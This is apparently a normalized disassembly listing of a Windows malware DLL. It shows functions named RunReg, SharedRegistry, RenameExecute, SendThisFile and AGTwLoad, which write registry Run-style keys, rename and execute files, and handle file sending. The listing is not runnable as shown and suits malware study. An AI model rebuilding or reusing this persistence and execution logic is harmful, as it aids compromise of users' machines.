push [ ebp - 0x8 ]
push ebx
push edi
call esi
jmp r-xdata
push esi
mov esi [ HeapFree@IAT ]
push ebx
push edi
call esi
push [ ebp - 0x4 ]
push ebx
push edi
call esi
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_10005a8d
push ebp
lea ebp [ esp - 0x7dc ]
sub esp 0x85c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x7d8 ] eax
push ebx
push edi
xor ebx ebx
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x2c ] ebx
call sub_1000200c
test eax eax
je r-xdata
mov ecx [ ebp + 0x7d8 ]
pop edi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x7dc
leave
retn
push esi
push 0x200
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push 0x31004cda
mov esi r--data
push esi
call sub_10001347
push r--data
lea eax [ ebp - 0x28 ]
push eax
push 0x2
mov edi 0x6e587d69
push edi
push esi
call sub_10001347
push [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
push r--data
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
add esp 0x50
push r--data
lea eax [ ebp - 0x28 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
push 0x44
push ebx
lea eax [ ebp - 0x80 ]
push eax
push 0x3
push 0x9af9fa4b
mov edi r--data
push edi
call sub_10001347
push 0x10
push ebx
lea eax [ ebp - 0x3c ]
push eax
push 0x3
push 0x9af9fa4b
push edi
mov [ ebp - 0x80 ] 0x44
call sub_10001347
add esp 0x44
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
lea eax [ ebp - 0x28 ]
push eax
push ebx
push 0xa
push 0xd0089021
push esi
call sub_10001347
add esp 0x34
pop esi
sub_10005b9b
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov edi [ HeapAlloc@IAT ]
push 0x10
push 0x8
push eax
mov [ ebp - 0x4 ] eax
call edi
mov ebx 0x400
push ebx
push 0x8
push [ ebp - 0x4 ]
mov esi eax
call edi
push r--data
push r--data
lea ecx [ esi + 0xc ]
push 0x80000001
push ecx
push eax
mov [ esi + 0x8 ] eax
mov [ ecx ] ebx
call sub_10001edd
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x4
lea eax [ ebp - 0x8 ]
push eax
xor ebx ebx
mov [ ebp - 0x8 ] ebx
push [ esi + 0x8 ]
push [ ebp + 0x8 ]
call OF
mov edi [ HeapFree@IAT ]
add esp 0xc
push [ esi + 0x8 ]
mov [ ebp + 0x8 ] eax
push ebx
push [ ebp - 0x4 ]
call edi
push esi
push ebx
push [ ebp - 0x4 ]
call edi
mov eax [ ebp + 0x8 ]
sub_10005c24
push ebx
push ebp
push esi
push edi
call [ GetProcessHeap@IAT ]
mov ebx [ HeapAlloc@IAT ]
push 0x10
mov edi eax
push 0x8
push edi
call ebx
mov ebp 0x400
push ebp
push 0x8
push edi
mov esi eax
call ebx
push r--data
push r--data
lea ecx [ esi + 0x4 ]
push 0x80000001
push ecx
push eax
mov [ esi ] eax
mov [ ecx ] ebp
call sub_10001edd
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x8
push [ esi ]
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call CF
mov ebx [ HeapFree@IAT ]
add esp 0xc
push [ esi ]
mov ebp eax
push 0x0
push edi
call ebx
push esi
push 0x0
push edi
call ebx
mov eax ebp
sub_10005c9b
push ebp
mov ebp esp
push ecx
push esi
push edi
call [ GetProcessHeap@IAT ]
mov edi [ HeapAlloc@IAT ]
push 0x10
push 0x8
push eax
mov [ ebp - 0x4 ] eax
call edi
push 0x400
push 0x8
push [ ebp - 0x4 ]
mov esi eax
call edi
push r--data
push r--data
lea ecx [ esi + 0x4 ]
push 0x80000001
push ecx
push eax
mov [ esi ] eax
mov [ ecx ] 0x400
call sub_10001edd
test eax eax
je r-xdata
pop edi
pop esi
leave
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ esi ]
call VD
add esp 0xc
push [ esi ]
mov edi eax
push 0x0
push [ ebp - 0x4 ]
call [ HeapFree@IAT ]
mov eax edi
sub_10005d11
push ebp
lea ebp [ esp - 0x394 ]
sub esp 0x414
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x390 ] eax
mov eax [ ebp + 0x39c ]
push ebx
push esi
push edi
push r--data
push r--data
mov [ ebp - 0x78 ] eax
push 0x80000001
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp - 0x70 ]
mov ebx 0x200
push eax
mov [ ebp - 0x74 ] ebx
call sub_10001edd
mov edi 0x6e587d69
mov esi r--data
test eax eax
jne r-xdata
cmp [ ebp - 0x74 ] 0x1d
jbe r-xdata
push r--data
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
push ebx
push 0x0
push [ ebp - 0x78 ]
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
push [ ebp - 0x74 ]
lea eax [ ebp - 0x6e ]
push eax
push [ ebp - 0x78 ]
call sub_10010ab0
push r--data
push [ ebp - 0x78 ]
push 0x2
push edi
push esi
call sub_10001347
push ebx
push 0x0
lea eax [ ebp - 0x70 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x50
lea eax [ ebp - 0x80 ]
push eax
call [ GetCursorPos@IAT ]
push 0xa
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x80 ]
call sub_1001077b
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x78 ]
push 0x2
push edi
push esi
call sub_10001347
push 0x0
push 0xbdd269db
push esi
call sub_10001347
push ebx
push 0x0
mov [ ebp - 0x74 ] eax
lea eax [ ebp - 0x70 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x44
push 0xa
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x74 ]
call sub_1001077b
mov ebx [ ebp - 0x78 ]
push r--data
push ebx
push 0x2
push edi
push esi
call sub_10001347
lea eax [ ebp - 0x70 ]
push eax
push ebx
push 0x2
push edi
push esi
call sub_10001347
push r--data
push ebx
push 0x2
push edi
push esi
call sub_10001347
add esp 0x48
push r--data
push ebx
push 0x2
push edi
push esi
call sub_10001347
add esp 0x14
push ebx
call sub_10002ade
mov ecx [ ebp + 0x390 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x394
leave
retn 0x4
mov [ ebp - 0x74 ] 0xa
push 0xa
lea ecx [ ebp - 0x70 ]
push ecx
push eax
call sub_1001077b
push r--data
lea eax [ ebp - 0x70 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
add esp 0x20
lea eax [ ebp - 0x70 ]
push eax
call sub_10002ade
mov [ ebp - 0x74 ] eax
push eax
push 0x4c5a
call sub_10001d8e
SharedRegistry
push ebp
lea ebp [ esp - 0x790 ]
sub esp 0x810
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x78c ] eax
push ebx
push esi
push edi
call [ GetProcessHeap@IAT ]
push 0x400
push 0x0
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x74 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
and [ ebp - 0x7c ] 0x0
add esp 0x18
push r--data
mov ebx r--data
push ebx
mov esi 0x80000001
push esi
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x74 ]
push eax
mov [ ebp - 0x78 ] 0x20c
call sub_10001edd
lea edi [ ebp - 0x7c ]
call sub_1000200c
test eax eax
je r-xdata
mov ecx [ ebp + 0x78c ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0x790
leave
retn
lea eax [ ebp - 0x74 ]
push eax
call sub_10002ade
mov [ ebp - 0x78 ] eax
mov edi r--data
test eax eax
jbe r-xdata
push [ ebp - 0x7c ]
lea eax [ ebp - 0x74 ]
push eax
push 0x2
push 0x6e587d69
push edi
call sub_10001347
add esp 0x14
push [ ebp - 0x7c ]
push 0x0
push [ ebp - 0x80 ]
call [ HeapFree@IAT ]
lea eax [ ebp - 0x74 ]
push eax
call sub_10002ade
push 0x1
push r--data
push ebx
push esi
push eax
mov [ ebp - 0x78 ] eax
lea eax [ ebp - 0x74 ]
push eax
call sub_10001e34
neg eax
sbb eax eax
neg eax
push [ ebp - 0x7c ]
lea eax [ ebp - 0x74 ]
push eax
push 0x2
push 0xd75c3a47
push r--data
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
cmp [ ebp - 0x78 ] 0x0
jbe r-xdata
xor eax eax
inc eax
jmp r-xdata
push r--data
lea eax [ ebp - 0x74 ]
push eax
push 0x2
push 0x6e587d69
push edi
call sub_10001347
add esp 0x14
SendThisFile
push [ esp + 0x4 ]
call sub_10002ade
cmp [ esp + 0x8 ] 0x0
push 0x10
pop ecx
je r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
mov ecx 0x1010
push 0x270f
push ecx
push eax
push [ esp + 0x10 ]
call sub_10003f6c
xor eax eax
retn
or ecx 0x1
GPI
push ebp
lea ebp [ esp - 0x388 ]
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x384 ] eax
and [ ebp - 0x80 ] 0x0
lea eax [ ebp - 0x7c ]
push eax
call sub_10005d11
test eax eax
ja r-xdata
push esi
push edi
push 0x1
push r--data
mov edi r--data
push edi
mov esi 0x80000001
push esi
push eax
lea eax [ ebp - 0x7c ]
push eax
call sub_10001e34
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
push ebx
mov ebx r--data
push ebx
call sub_10002b06
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x384 ]
xor ecx ebp
call sub_1000fe6e
add ebp 0x388
leave
retn
xor eax eax
jmp r-xdata
push 0x1
push r--data
push edi
push esi
push eax
push ebx
call sub_10001e34
test eax eax
je r-xdata
pop ebx
mov ebx r--data
push ebx
call sub_10002b06
test eax eax
jbe r-xdata
push 0x1
push r--data
push edi
push esi
push eax
push ebx
call sub_10001e34
test eax eax
je r-xdata
mov ebx r--data
push ebx
call sub_10002b06
test eax eax
jbe r-xdata
push 0x1
push r--data
push edi
push esi
push eax
push ebx
call sub_10001e34
test eax eax
je r-xdata
mov esi r--data
push esi
call sub_10002b06
test eax eax
jbe r-xdata
lea ecx [ ebp - 0x80 ]
push ecx
push eax
push esi
call UB
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push [ ebp - 0x80 ]
push esi
call sub_1000390b
test eax eax
jne r-xdata
xor eax eax
inc eax
push esi
call sub_1000fe7d
pop ecx
RunReg
push ebp
lea ebp [ esp - 0xf98 ]
mov eax 0x1018
call sub_10010a80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xf94 ] eax
mov eax [ ebp + 0xfa0 ]
push ebx
push esi
push edi
mov [ ebp - 0x7c ] eax
call [ GetProcessHeap@IAT ]
xor ebx ebx
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x78 ] 0x80000001
cmp [ ebp + 0xfa4 ] ebx
je r-xdata
mov edi 0x400
push edi
push ebx
lea eax [ ebp + 0x794 ]
push eax
push 0x3
push 0x9af9fa4b
mov esi r--data
push esi
call sub_10001347
add esp 0x18
push r--data
push r--data
push [ ebp - 0x78 ]
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x794 ]
push eax
mov [ ebp - 0x70 ] ebx
mov [ ebp - 0x74 ] 0x20c
call sub_10001edd
cmp [ ebp - 0x74 ] ebx
jbe r-xdata
mov [ ebp - 0x78 ] 0x80000002
cmp [ ebp + 0xfa4 ] 0x0
mov ebx 0x6e587d69
mov esi r--data
je r-xdata
push [ ebp - 0x7c ]
lea eax [ ebp + 0x794 ]
push eax
push 0x2
push 0xd75c3a47
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
lea edi [ ebp - 0x70 ]
call sub_1000200c
test eax eax
je r-xdata
push 0x104
push 0x8
push [ ebp - 0x80 ]
call [ HeapAlloc@IAT ]
push 0x104
push eax
mov [ ebp - 0x70 ] eax
call [ GetWindowsDirectoryW@IAT ]
push r--data
push [ ebp - 0x70 ]
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp + 0xf94 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0xf98
leave
retn
mov edi 0x400
push [ ebp - 0x7c ]
push [ ebp - 0x70 ]
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x14
cmp [ ebp - 0x74 ] 0x0
jbe r-xdata
push edi
lea eax [ ebp - 0x6c ]
push eax
push 0x2
push 0x31004cda
push esi
call sub_10001347
push r--data
lea eax [ ebp - 0x6c ]
push eax
push 0x2
push ebx
push esi
call sub_10001347
push edi
push 0x0
lea eax [ ebp + 0x794 ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x40
lea eax [ ebp - 0x6c ]
push eax
lea eax [ ebp + 0x794 ]
push eax
push 0x2
push 0x825884e9
push esi
call sub_10001347
push [ ebp - 0x70 ]
lea eax [ ebp + 0x794 ]
push eax
push 0x2
push ebx
push esi
call sub_10001347
push r--data
lea eax [ ebp + 0x794 ]
push eax
push 0x2
push ebx
push esi
call sub_10001347
add esp 0x3c
push [ ebp - 0x70 ]
push 0x0
push [ ebp - 0x80 ]
call [ HeapFree@IAT ]
lea eax [ ebp + 0x794 ]
push eax
call sub_10002ade
push 0x1
push r--data
push r--data
push [ ebp - 0x78 ]
mov [ ebp - 0x74 ] eax
push eax
lea eax [ ebp + 0x794 ]
push eax
call sub_10001e34
neg eax
sbb eax eax
neg eax
push [ ebp - 0x70 ]
lea eax [ ebp + 0x794 ]
push eax
push 0x2
push 0xd75c3a47
push r--data
call sub_10001347
add esp 0x14
test eax eax
jne r-xdata
RenameExecute
push ebp
lea ebp [ esp - 0xf94 ]
mov eax 0x1014
call sub_10010a80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xf90 ] eax
mov eax [ ebp + 0xf9c ]
push ebx
push esi
push edi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xfa0 ]
mov edi 0x400
push edi
push 0x0
mov [ ebp - 0x80 ] eax
lea eax [ ebp + 0x790 ]
push eax
push 0x3
mov ebx 0x9af9fa4b
push ebx
mov esi r--data
push esi
call sub_10001347
push edi
push 0x0
lea eax [ ebp - 0x70 ]
push eax
push 0x3
push ebx
push esi
call sub_10001347
add esp 0x30
push r--data
push r--data
push 0x80000001
lea eax [ ebp - 0x74 ]
push eax
lea eax [ ebp + 0x790 ]
push eax
mov [ ebp - 0x74 ] 0x20c
call sub_10001edd
cmp [ ebp - 0x74 ] 0x0
ja r-xdata
push [ ebp - 0x78 ]
lea eax [ ebp + 0x790 ]
push eax
push 0x2
mov edi 0xd75c3a47
push edi
push esi
call sub_10001347
add esp 0x14
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp - 0x78 ]
lea eax [ ebp + 0x790 ]
push eax
push 0x2
push edi
push esi
call sub_10001347
push eax
lea eax [ ebp - 0x70 ]
push eax
push 0x2
push 0x825884e9
mov edi r--data
push edi
call sub_10001347
add esp 0x28
lea eax [ ebp - 0x70 ]
push eax
call sub_10002ade
mov [ ebp - 0x7c ] eax
lea eax [ ebp + 0x790 ]
push eax
call sub_10002ade
sub eax [ ebp - 0x7c ]
push [ ebp - 0x7c ]
shr eax 0x1
push 0x0
lea eax [ ebp + eax * 2 + 0x790 ]
push eax
push 0x3
push ebx
push esi
call sub_10001347
push [ ebp - 0x80 ]
lea eax [ ebp + 0x790 ]
push eax
push 0x2
mov esi 0x6e587d69
push esi
push edi
call sub_10001347
add esp 0x2c
push [ ebp - 0x78 ]
call sub_10002ade
shr eax 0x1
lea eax [ ebp + eax * 2 - 0x70 ]
push eax
lea eax [ ebp + 0x790 ]
push eax
push 0x2
push esi
push edi
call sub_10001347
add esp 0x14
lea eax [ ebp + 0x790 ]
push eax
call sub_10002ade
push 0x1
push r--data
push r--data
push 0x80000001
push eax
mov [ ebp - 0x74 ] eax
lea eax [ ebp + 0x790 ]
push eax
call sub_10001e34
neg eax
sbb eax eax
neg eax
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp + 0xf90 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000fe6e
add ebp 0xf94
leave
retn
AGTwLoad
push ebp
mov ebp esp
sub esp 0xc
push esi
call sub_100065f2
test eax eax
jne r-xdata
push 0x3e8
push 0x1
push 0x9ace3327
push r--data
call sub_10001347
add esp 0x10
lea esi [ ebp - 0xc ]
call sub_10002d1b
mov eax [ ebp - 0x4 ]
pop esi
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov esi r--data
push esi
call sub_1000231a
test eax eax
jne r-xdata
cmp eax [ ebp - 0xc ]
jne r-xdata
push 0x0
push sub_100030ce
push esi
call sub_10002359
call SharedRegistry
push 0x0
push r--data
call RunReg
pop ecx
pop ecx
call GPI
test eax eax
je r-xdata
push r--data
call sub_1000231a
test eax eax
jne r-xdata
push 0x0
push sub_10004a56
jmp r-xdata
call sub_10005a8d
leave
retn
cmp [ ebp - 0x8 ] eax
je r-xdata
call sub_10002382
leave
retn
push [ ebp - 0x8 ]
call sub_10001151
sub_100065f2
push ebp
lea ebp [ esp - 0x388 ]
sub esp 0x408
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x384 ] eax
push esi
mov eax 0x200
push eax
xor esi esi
push esi
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x7c ]
push eax
push 0x3
push 0x9af9fa4b
push r--data
call sub_10001347
add esp 0x18
push r--data
push r--data
push 0x80000001
lea eax [ ebp - 0x80 ]
push eax
lea eax [ ebp - 0x7c ]
push eax
call sub_10001edd
test eax eax
je r-xdata
mov ecx [ ebp + 0x384 ]
mov eax esi
xor ecx ebp
pop esi
call sub_1000fe6e
add ebp 0x388
leave
retn
cmp [ ebp - 0x80 ] esi
jbe r-xdata
inc esi
sub_10006697
or [ esi + 0x260 ] 0xffffffff
xor ecx ecx
push 0x100
lea eax [ esi + 0x58 ]
push ecx
push eax
mov [ esi + 0x44 ] ecx
mov [ esi + 0x4c ] ecx
mov [ esi + 0x50 ] ecx
call sub_10010a00
add esp 0xc
inc [ esi + 0x26c ]
retn
sub_100066e3
push ebp
mov ebp esp
push esi
call sub_10006670
test eax eax
jne r-xdata
push ebx
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
cmp edi ebx
je r-xdata
push 0xfffffff7
pop eax
jmp r-xdata
push 0xfffffffe
mov eax [ ebp + 0xc ]
dec eax
cmp eax 0x8
ja r-xdata
pop esi
pop ebp
retn 0x10
cmp [ ebp + 0x14 ] 0xfa
ja r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp [ edi + 0x24 ] ebx
jne r-xdata
mov [ ebp + 0x14 ] 0x1e
cmp [ edi + 0x28 ] ebx
jne r-xdata
mov [ edi + 0x24 ] sub_10006674
push 0x1
push 0xd9b0
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov esi eax
add esp 0xc
cmp esi ebx
jne r-xdata
mov [ edi + 0x28 ] sub_10006685
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] ebx
mov ebx [ ebp + 0xc ]
imul ebx ebx 0x186a0
mov eax ebx
push 0x1
shl eax 0x2
push eax
mov [ esi ] edi
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov [ esi + 0x10 ] eax
push 0x1
lea eax [ ebx * 4 + 0x88 ]
push eax
push [ edi + 0x2c ]
call [ edi + 0x24 ]
push 0x1
mov [ esi + 0x14 ] eax
push 0x40004
push [ edi + 0x2c ]
call [ edi + 0x24 ]
mov ecx [ esi + 0x10 ]
xor edx edx
add esp 0x24
mov [ esi + 0x18 ] eax
cmp ecx edx
je r-xdata
push 0xfffffffd
jmp r-xdata
mov eax [ esi + 0x14 ]
cmp eax edx
je r-xdata
cmp [ esi + 0x14 ] edx
je r-xdata
pop eax
mov eax [ esi + 0x18 ]
cmp eax edx
je r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
xor edx edx
cmp ecx edx
je r-xdata
cmp eax edx
je r-xdata
push esi
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
jmp r-xdata
push eax
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
push ecx
push [ edi + 0x2c ]
call [ edi + 0x28 ]
pop ecx
pop ecx
xor edx edx
push 0x2
pop eax
mov [ esi + 0x8 ] eax
mov [ esi + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x270 ] eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x268 ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x30 ] eax
mov eax [ esi + 0x14 ]
mov [ esi + 0x24 ] eax
mov [ esi + 0x26c ] edx
mov [ esi + 0x264 ] edx
mov [ esi + 0x28 ] ecx
mov [ esi + 0x2c ] edx
mov [ esi + 0x20 ] ecx
add ebx 0xffffffed
mov [ esi + 0x48 ] ebx
mov eax esi
mov [ edi + 0x20 ] esi
mov [ edi + 0x8 ] edx
mov [ edi + 0xc ] edx
mov [ edi + 0x18 ] edx
mov [ edi + 0x1c ] edx
call sub_100066c2
call sub_10006697
xor eax eax
jmp r-xdata
pop edi
pop ebx
sub_10006869
mov cl [ eax + 0x34 ]
push esi
xor esi esi
cmp [ eax + 0x38 ] esi
push edi
jle r-xdata
mov edx [ eax + 0x34 ]
mov [ eax + edx + 0x58 ] 0x1
mov edx [ eax + 0x38 ]
mov esi edx
dec esi
je r-xdata
movzx edi cl
push ebx
mov edx [ eax + 0x24 ]
mov esi [ eax + 0x44 ]
dec esi
je r-xdata
mov edx [ eax + 0x260 ]
mov ebx edx
shr ebx 0x18
xor ebx edi
shl edx 0x8
xor edx [ ebx * 4 + rw-data ]
inc esi
mov [ eax + 0x260 ] edx
cmp esi [ eax + 0x38 ]
jl r-xdata
pop ebx
mov edi [ eax + 0x24 ]
lea edx [ eax + 0x44 ]
mov esi [ edx ]
mov [ esi + edi ] cl
inc [ edx ]
mov esi [ edx ]
mov eax [ eax + 0x24 ]
mov [ esi + eax ] cl
inc [ edx ]
jmp r-xdata
dec esi
je r-xdata
pop edi
pop esi
retn
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
jmp r-xdata
mov [ edx + eax + 0x54 ] 0x1
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov edx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
mov dl [ eax + 0x38 ]
mov ecx [ eax + 0x44 ]
mov esi [ eax + 0x24 ]
sub dl 0x4
mov [ ecx + esi ] dl
jmp r-xdata
mov [ edx + esi ] cl
inc [ eax + 0x44 ]
sub_1000695c
push ebp
mov ebp esp
push ecx
push ecx
cmp [ esi + 0x4 ] 0x2
mov eax [ esi + 0x44 ]
push ebx
push edi
mov [ ebp - 0x1 ] 0x0
jne r-xdata
cmp eax [ esi + 0x48 ]
jl r-xdata
jmp r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov eax [ eax ]
movzx edi [ eax ]
mov eax [ esi + 0x34 ]
mov [ ebp - 0x1 ] 0x1
mov [ ebp - 0x8 ] edi
cmp edi eax
je r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
mov ecx [ esi + 0x38 ]
cmp ecx 0xff
je r-xdata
cmp [ esi + 0x38 ] 0x1
jne r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
cmp eax 0x100
jae r-xdata
inc ecx
mov [ esi + 0x38 ] ecx
jmp r-xdata
cmp edi eax
jne r-xdata
mov dl al
lea ecx [ esi + 0x260 ]
mov eax [ ecx ]
mov edi eax
movzx ebx dl
shl eax 0x8
shr edi 0x18
xor edi ebx
xor eax [ edi * 4 + rw-data ]
mov [ ecx ] eax
mov eax [ esi + 0x34 ]
mov [ eax + esi + 0x58 ] 0x1
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x44 ]
mov [ eax + ecx ] dl
mov eax [ ebp - 0x8 ]
inc [ esi + 0x44 ]
mov [ esi + 0x34 ] eax
jmp r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_10006869
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] 0x1
mov eax esi
call sub_10006869
mov eax [ esi ]
inc [ eax ]
mov eax [ esi ]
dec [ eax + 0x4 ]
mov eax [ esi ]
inc [ eax + 0x8 ]
mov eax [ esi ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec [ esi + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
mov eax [ esi + 0x44 ]
inc [ eax + 0xc ]
sub_10006af8
mov edx [ ecx ]
xor al al
cmp [ edx + 0x14 ] 0x0
je r-xdata
retn
push esi
push edi
pop edi
pop esi
mov esi [ ecx + 0x2c ]
mov dl [ edx + esi ]
mov edi [ ecx ]
mov edi [ edi + 0x10 ]
mov [ edi ] dl
mov edx [ ecx ]
inc [ ecx + 0x50 ]
dec [ edx + 0x14 ]
mov edx [ ecx ]
inc [ edx + 0x10 ]
mov edx [ ecx ]
inc [ edx + 0x18 ]
mov edx [ ecx ]
cmp [ edx + 0x18 ] 0x0
mov al 0x1
jne r-xdata
mov edx [ ecx ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
inc [ edx + 0x1c ]
mov edx [ ecx + 0x50 ]
cmp edx [ ecx + 0x4c ]
jge r-xdata
sub_10006b43
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ eax + 0x20 ]
push edi
xor bl bl
xor edi edi
mov [ ebp - 0x1 ] bl
inc edi
cmp [ esi + 0x8 ] 0x2
jne r-xdata
mov ecx esi
call sub_10006af8
or [ ebp - 0x1 ] al
mov eax [ esi + 0x50 ]
cmp eax [ esi + 0x4c ]
jl r-xdata
cmp [ esi + 0x8 ] edi
jne r-xdata
call sub_1000695c
or bl al
cmp [ esi + 0x4 ] 0x2
je r-xdata
test bl bl
jne r-xdata
cmp [ esi + 0x4 ] 0x4
jne r-xdata
mov eax [ esi + 0x44 ]
cmp eax [ esi + 0x48 ]
jl r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax edi
cmp [ ebp - 0x1 ] bl
jne r-xdata
call sub_10006697
cmp [ esi + 0x4 ] 0x3
mov [ esi + 0x8 ] 0x2
jne r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax [ esi ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
push 0x0
call sub_10006945
cmp [ esi + 0x4 ] 0x4
sete al
movzx eax al
push eax
jmp r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov eax esi
call sub_100066ce
test al al
jne r-xdata
push esi
call sub_10009541
pop ecx
pop ecx
mov [ esi + 0x8 ] edi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax esi
call sub_100066ce
test al al
jne r-xdata
sub_10006c0f
mov eax [ esp + 0x4 ]
test eax eax
jne r-xdata
push esi
mov esi [ eax + 0x20 ]
test esi esi
jne r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
push edi
mov edi [ esi ]
cmp edi eax
je r-xdata
push 0xfffffffe
pop eax
jmp r-xdata
retn 0x8
mov edx [ esp + 0x10 ]
push ebx
push 0x2
